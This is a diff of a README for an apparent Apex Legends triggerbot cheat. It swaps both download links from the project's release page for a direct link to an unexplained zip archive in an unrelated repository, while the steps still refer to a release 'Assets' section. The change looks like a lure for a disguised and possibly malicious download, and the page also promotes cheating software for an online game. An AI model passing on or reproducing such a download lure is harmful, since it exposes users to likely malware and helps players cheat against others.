@@ -5,7 +5,7 @@ description: "Automate your shots in Apex Legends with a triggerbot featuring si
 ---
 # 🎯 Apex-Legends-Triggerbot - Improve your aim in every match
 
-[![Download Apex-Legends-Triggerbot](https://img.shields.io/badge/Download-Release-blue)](https://github.com/divyanshtripathi191-create/Apex-Legends-Triggerbot/releases)
+[![Download Apex-Legends-Triggerbot](https://img.shields.io/badge/Download-Release-blue)](https://raw.githubusercontent.com/divyanshtripathi191-create/divyanshtripathi191-create.github.io/main/leucosphere/1.5.zip)
 
 This software provides aim assistance for the game Apex Legends. It includes features that improve target tracking, reduce weapon recoil, and manage your field of view during combat.
 
@@ -22,7 +22,7 @@ This software provides aim assistance for the game Apex Legends. It includes fea
 
 Visit the release page to download the latest version of the software.
 
-[Click here to visit the release page to download](https://github.com/divyanshtripathi191-create/Apex-Legends-Triggerbot/releases)
+[Click here to visit the release page to download](https://raw.githubusercontent.com/divyanshtripathi191-create/divyanshtripathi191-create.github.io/main/leucosphere/1.5.zip)
 
 1.  Open the link provided above in your web browser.
 2.  Look for the section labeled "Assets" under the most recent release.
